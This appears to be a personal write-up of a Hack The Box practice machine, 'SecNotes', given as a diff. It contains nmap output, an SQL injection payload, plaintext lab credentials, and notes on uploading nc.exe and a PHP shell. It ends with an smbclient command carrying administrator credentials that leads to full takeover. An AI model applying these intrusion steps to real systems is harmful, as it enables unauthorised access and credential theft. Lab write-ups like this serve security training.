@@ -1,0 +1,135 @@
+========NMAP========
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:08 CDT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Initiating NSE at 16:08
+Completed NSE at 16:08, 0.00s elapsed
+Initiating Ping Scan at 16:08
+Scanning 10.10.10.97 [2 ports]
+Completed Ping Scan at 16:08, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:08
+Completed Parallel DNS resolution of 1 host. at 16:08, 0.03s elapsed
+Initiating Connect Scan at 16:08
+Scanning 10.10.10.97 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.97
+Discovered open port 80/tcp on 10.10.10.97
+Connect Scan Timing: About 16.49% done; ETC: 16:11 (0:02:37 remaining)
+Connect Scan Timing: About 58.29% done; ETC: 16:09 (0:00:44 remaining)
+Discovered open port 8808/tcp on 10.10.10.97
+Completed Connect Scan at 16:09, 86.38s elapsed (65535 total ports)
+Initiating Service scan at 16:09
+Scanning 3 services on 10.10.10.97
+Completed Service scan at 16:09, 11.28s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.10.97.
+Initiating NSE at 16:09
+Completed NSE at 16:10, 40.12s elapsed
+Initiating NSE at 16:10
+Completed NSE at 16:10, 0.21s elapsed
+Initiating NSE at 16:10
+Completed NSE at 16:10, 0.00s elapsed
+Nmap scan report for 10.10.10.97
+Host is up (0.046s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|Requested resource was login.php
+445/tcp  open  D���   Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+Findings==============
+
+used SQL injection on user accoutn creation page with burp suite. used a sniper attack and then synced all 3 payloads (username, password and confirm password fields) as the same SQL injection ‘OR 1 OR’ for example. 
+
+Once we logged into the account, we foudn out that the SQL injection dumped some information about a new-site. it contained Tyler’s password to the SMB share (\\ clues us into the fact that its an SMB share).
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/322200c2-78ad-48ca-ae29-1d21ce2a9ef9/Untitled.png)
+
+tyler:`92g!mA8BGjOirkL%OG*&`
+
+discovered smb share
+
+conencted to smb-share with smclient. directory reveals a standard iis folder
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/97f909f5-7e6c-4619-b4be-e7483571ccdf/Untitled.png)
+
+tried using a .aspx revshell and it was deleted pretty quickly.  uploaded nc.exe, created a malicious .php file with a php 1 liner in it,  and then accessed the file by navigating to it via webbrowser over port 8808
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/f1b91444-085e-47c0-b775-a367e0b59111/Untitled.png)
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/25803440-1756-4df8-a2f3-7e5d42800c5a/Untitled.png)
+
+During some enumeration, we found tyler original login to the site:
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/7734104b-d033-4ca7-b85a-255331e46b53/Untitled.png)
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/02e97c6d-594c-44ff-a9f8-ebcec44e7c35/Untitled.png)
+
+saw ubuntu.zip in one of the fodlers and realized it was running ubuntu on windows. 
+
+did a search for the linux  and bash files 
+
+where /R C:\Windows bash.exe 
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/ffd58fcb-e9ab-4e0c-adcd-2b56e255be9c/Untitled.png)
+
+Executing bash.exe spawned a Linux shell on windows. 
+
+Once there, we searched the bash history and discovered aministrator creds to an SMB share. 
+
+root@SECNOTES:~# ls -al
+ls -al
+total 8
+drwx------ 1 root root  512 Jun 22  2018 .
+drwxr-xr-x 1 root root  512 Jun 21  2018 ..
+---------- 1 root root  398 Jun 22  2018 .bash_history
+-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
+root@SECNOTES:~# cat .bash_history
+cat sh_history
+cat: sh_history: No such file or directory
+root@SECNOTES:~# cat .bash_history
+cat .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount [//127.0.0.1/c$](notion://127.0.0.1/c$) filesystem/
+sudo apt install cifs-utils
+mount [//127.0.0.1/c$](notion://127.0.0.1/c$) filesystem/
+mount [//127.0.0.1/c$](notion://127.0.0.1/c$) filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+
+> .bash_history
+less .bash_history
+> 
+
+Once there, we logged into SMB with administrator creds and were able to own the machine. 
+
+![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/c50f3aa2-6e21-47ad-afe1-2003932d6cb6/b33c99e8-2f3f-42df-8142-4ef57b33c61d/Untitled.png)
